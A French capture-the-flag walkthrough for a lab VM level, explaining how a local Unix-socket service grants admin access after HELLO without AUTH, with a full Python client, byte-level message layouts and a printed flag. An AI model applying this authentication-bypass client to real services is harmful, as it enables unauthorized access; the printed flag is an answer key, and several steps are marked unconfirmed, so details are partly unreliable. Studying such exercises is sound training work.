# Level08 — Contourner une authentification par un défaut d’état

**Point de départ :** une session sur la VM Snow Crash sous `level08`. Le flag de ce niveau sert de mot de passe au compte `level09`.

## Objectif

Nous sommes connectés avec l’utilisateur `level08` et nous cherchons le secret de `flag08` afin de passer à `level09`.

Un service appelé **Black Sun** peut lire ce secret, mais son accès est normalement protégé par une authentification. Notre objectif est de comprendre son protocole, puis de chercher une erreur qui permette de contourner cette authentification.

Il faut distinguer deux sujets :

| Sujet | Rôle |
| --- | --- |
| Le socket, le format binaire, le checksum et le little-endian | Ils permettent de communiquer correctement avec Black Sun. |
| La mauvaise gestion des états | C’est la faille qui permet de contourner l’authentification. |

Nous ne cassons donc ni un mot de passe ni le checksum. Nous profitons d’une erreur de logique dans le contrôle des autorisations.

## 1. Découvrir le service

Nous commençons par vérifier notre identité, nos groupes et les fichiers disponibles :

```bash
id
find /opt/snowcrash/level08 -maxdepth 3 -ls
```

Vérifier que `level08` appartient au groupe `blacksun`. Fichiers à rechercher :

| Fichier | Explication |
| --- | --- |
| `/opt/snowcrash/level08/blacksun` | Le programme exécutable. |
| `/opt/snowcrash/level08/blacksun.c` | Le code source qui décrit son fonctionnement. |

Nous lisons le code source :

```bash
cat /opt/snowcrash/level08/blacksun.c
```

Éléments à confirmer dans le code source, qui n’est pas fourni dans cette archive :

- le socket `/run/blacksun/blacksun.sock` ;
- les commandes `HELLO`, `AUTH` et `ADMIN` ;
- le format binaire des messages ;
- le calcul du checksum ;
- le chemin `/home/flag08/.flag` ;
- la vérification incorrecte de l’état de la connexion.

## 2. Comprendre le socket Unix

Un socket est un canal qui permet à deux programmes de communiquer.

```text
client Python
    │
    │ messages binaires
    ▼
/run/blacksun/blacksun.sock
    │
    ▼
service Black Sun
```

Vérifier que les permissions du socket permettent au groupe `blacksun` de s’y connecter. Ce droit de connexion ne constitue pas une authentification.

Trois notions distinctes :

- **communiquer** signifie pouvoir envoyer des messages au programme ;
- **s’authentifier** signifie prouver son identité ;
- **être autorisé** signifie avoir le droit d’effectuer une action précise.

Vérifier dans le code source que `/etc/blacksun/auth.key` est la clé utilisée pour l’authentification. La solution ne la lit pas et ne la modifie pas.

## 3. Comprendre la faille

Black Sun reconnaît trois commandes principales :

| Commande | Signification simple |
| --- | --- |
| `HELLO` | Commencer la conversation. |
| `AUTH` | Prouver notre identité. |
| `ADMIN` | Demander l’accès à une fonction protégée. |

### Fonctionnement attendu

Un protocole correct doit attendre la réussite de l’authentification avant d’autoriser une commande administrative :

```text
HELLO
  │
  ▼
attente de l’authentification
  │
  ▼
AUTH vérifiée
  │
  ▼
ADMIN autorisé
```

### Fonctionnement vulnérable

La méthode repose sur l’hypothèse que `HELLO` place la connexion dans un état nommé `AUTH`. Cet état devrait seulement signifier **« en attente d’authentification »**.

Vérifier que la macro `CHECK_STATE` utilisée pour `ADMIN` accepte un état supérieur ou égal à `AUTH`. Si c’est le cas, le service confond l’attente de l’authentification avec sa réussite.

Séquence à tester :

```text
HELLO → état AUTH → ADMIN accepté
```

Le client envoie ces deux messages sans envoyer de commande `AUTH`.

## 4. Pourquoi utiliser un script Python ?

Le client doit respecter le format binaire du protocole.

Le service n’attend pas directement le texte suivant :

```text
HELLO
ADMIN
```

Il attend des messages binaires composés d’un en-tête et, parfois, d’un contenu. Le client Python, reproduit intégralement en section 9, construit ces messages.

Il utilise deux modules de la bibliothèque standard de Python :

```python
import socket
import struct
```

| Module | Rôle |
| --- | --- |
| `socket` | Ouvrir la communication avec Black Sun et échanger des octets. |
| `struct` | Encoder les nombres dans le format binaire attendu par le programme C. |

## 5. Comprendre la structure d’un message

Le client utilise la structure suivante, à comparer au protocole défini dans le code C :

| Élément | Taille | Rôle |
| --- | ---: | --- |
| Version, état et commande | 1 octet | Indiquer la version du protocole, l’étape de la conversation et l’action demandée. |
| Longueur | 4 octets | Indiquer la taille du payload. |
| Checksum | 2 octets | Fournir une valeur de contrôle calculée à partir du payload. |
| Octet réservé | 1 octet | Emplacement supplémentaire fixé à zéro. |
| Payload | Taille variable | Contenir les données du message. |

L’en-tête mesure donc huit octets. Le premier octet rassemble trois informations :

```python
first_byte = VERSION | (state << 3) | (command << 5)
```

Les sept octets suivants sont construits ainsi :

```python
header = bytes([first_byte]) + struct.pack(
    "<IHB", len(payload), checksum(payload), 0
)
```

## 6. Comprendre le checksum

Le checksum est une valeur de contrôle calculée à partir du payload. Vérifier dans le code C que le service recalcule cette valeur et la compare à celle de l’en-tête.

Un checksum peut détecter certaines modifications du contenu, mais des contenus différents peuvent avoir la même valeur.

Le client utilise la formule suivante ; sa correspondance avec le code C reste à confirmer :

```python
def checksum(payload):
    result = 0
    for index, byte in enumerate(payload):
        result ^= byte ^ (index & 0xFF)
    return result
```

L’opérateur `^` effectue un XOR bit à bit. Son fonctionnement de base est le suivant :

| Premier bit | Second bit | Résultat XOR |
| ---: | ---: | ---: |
| 0 | 0 | 0 |
| 0 | 1 | 1 |
| 1 | 0 | 1 |
| 1 | 1 | 0 |

Pour le payload `ad de`, le calcul donne :

```text
(0xad XOR 0) XOR (0xde XOR 1) = 0x72
```

Le checksum n’est pas un mot de passe et ne prouve pas notre identité. Il sert seulement à produire un message que Black Sun considère comme bien formé.

## 7. Comprendre le little-endian

Le *little-endian* est une convention qui définit l’ordre des octets utilisés pour représenter un nombre.

Prenons la valeur `0xDEAD`, composée des deux octets `DE` et `AD`. Dans le message, elle est rangée ainsi :

```text
valeur lisible :      DE AD
octets little-endian: AD DE
```

La valeur ne change pas ; seul l’ordre de rangement de ses octets change. Le symbole `<` utilisé avec `struct.pack()` demande explicitement cet ordre :

```python
struct.pack("<H", 0xDEAD)
```

Cette instruction produit les octets `ad de`.

Le little-endian n’est pas la faille. C’est seulement une règle à respecter pour que le service interprète correctement les nombres envoyés.

## 8. Construire les deux messages

### Message `HELLO`

Le premier message utilise la version `1`, l’état initial `0`, la commande `HELLO` numérotée `0` et le payload `0xDEAD` :

```text
en-tête : 01 02 00 00 00 72 00 00
payload : ad de
```

| Octets | Signification |
| --- | --- |
| `01` | Version `1`, état `0` et commande `0`. |
| `02 00 00 00` | Longueur de deux octets. |
| `72 00` | Checksum `0x72`. |
| `00` | Octet réservé. |
| `ad de` | Payload `0xDEAD` en little-endian. |

Réponse attendue : `HELLO OK`. Le passage à l’état `AUTH` doit être confirmé dans le code C.

### Message `ADMIN`

Le second message utilise l’état `1`, la commande `ADMIN` numérotée `2` et aucun payload :

```text
49 00 00 00 00 00 00 00
```

Le premier octet vaut `0x49` :

```text
1 | (1 << 3) | (2 << 5) = 0x49
```

La longueur et le checksum valent zéro, car le message ne contient aucun payload.

## 9. Comprendre le client

Le client complet est reproduit ci-dessous, sans modification :

```python
#!/usr/bin/env python3
import socket
import struct


SOCKET_PATH = "/run/blacksun/blacksun.sock"
VERSION = 1


def checksum(payload):
    result = 0
    for index, byte in enumerate(payload):
        result ^= byte ^ (index & 0xFF)
    return result


def send_message(sock, command, state, payload=b"", response_lines=1):
    first_byte = VERSION | (state << 3) | (command << 5)
    # The fields use 7 bytes; the service reads an 8-byte raw header.
    header = bytes([first_byte]) + struct.pack(
        "<IHB", len(payload), checksum(payload), 0
    )
    sock.sendall(header + payload)

    response = bytearray()
    while response.count(b"\n") < response_lines:
        chunk = sock.recv(1)
        if not chunk:
            break
        response.extend(chunk)
    return response.decode()


with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as sock:
    sock.connect(SOCKET_PATH)
    print(send_message(sock, command=0, state=0, payload=b"\xad\xde"), end="")
    print(send_message(sock, command=2, state=1, response_lines=2), end="")
```

Il effectue les actions suivantes :

1. Il ouvre une connexion vers `/run/blacksun/blacksun.sock`.
2. Il construit le message `HELLO` dans le bon format.
3. Il calcule le checksum du payload et envoie le message.
4. Il lit la première réponse, attendue sous la forme `HELLO OK`.
5. Il construit et envoie directement le message `ADMIN`, sans envoyer de commande `AUTH`.
6. Il lit jusqu’à deux lignes de réponse administrative.

Les fonctions principales ont chacune un rôle précis :

| Partie | Rôle |
| --- | --- |
| `checksum()` | Calculer la valeur de contrôle du payload. |
| `struct.pack()` | Encoder les champs numériques dans l’ordre attendu. |
| `sock.sendall()` | Envoyer l’intégralité du message. |
| `sock.recv()` | Lire les réponses du service. |

Le bloc `with socket.socket(...) as sock` ferme automatiquement le socket à la fin, même si une erreur se produit.

## 10. Exécuter le client

Depuis `level08`, créer un fichier temporaire et y copier le bloc Python complet de la section 9 :

```bash
vi /tmp/blacksun_client.py
```

Nous lançons ensuite le script :

```bash
python3 /tmp/blacksun_client.py
```

Résultat de référence (à confirmer sur la VM) :

```text
HELLO OK
ACCESS GRANTED
FLAG=s5cAhoAfNT9GrgqykhZavyBg9
```

Si cette sortie est confirmée, le service a fourni le secret sans vérification de la clé d’authentification.
